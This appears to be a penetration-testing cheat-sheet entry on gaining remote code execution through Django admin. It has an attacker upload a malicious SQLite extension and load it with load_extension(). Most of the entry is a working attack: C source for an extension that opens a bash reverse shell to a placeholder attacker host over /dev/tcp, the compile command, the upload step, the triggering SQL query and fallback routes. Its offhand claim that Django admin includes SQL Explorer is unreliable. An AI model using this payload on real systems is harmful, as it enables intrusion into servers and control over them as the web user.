# SQLite Extension RCE via Django Admin

Django admin includes SQL Explorer — if admin access is achieved and the Django app uses SQLite, upload a malicious shared object as a "media" file, then call `SELECT load_extension('/path/to/uploaded/evil.so')` to execute code as the web user.

```bash
# 1. Compile malicious SQLite extension (reverse shell)
cat > evil.c << 'EOF'
#include <sqlite3ext.h>
SQLITE_EXTENSION_INIT1
int sqlite3_evil_init(sqlite3 *db, char **err, const sqlite3_api_routines *api) {
    SQLITE_EXTENSION_INIT2(api);
    system("bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'");
    return SQLITE_OK;
}
EOF
gcc -shared -fPIC -o evil.so evil.c -lsqlite3

# 2. Upload evil.so via Django admin file upload (any model with FileField)
# Note the upload path (usually /media/<date>/evil.so or similar)

# 3. Execute via SQL Explorer or admin query endpoint:
# SELECT load_extension('/var/www/media/uploads/evil.so');
```

If `load_extension()` is disabled in the SQLite config, check for:
- File manager features that write to web root
- Arbitrary template/plugin upload paths that Django serves
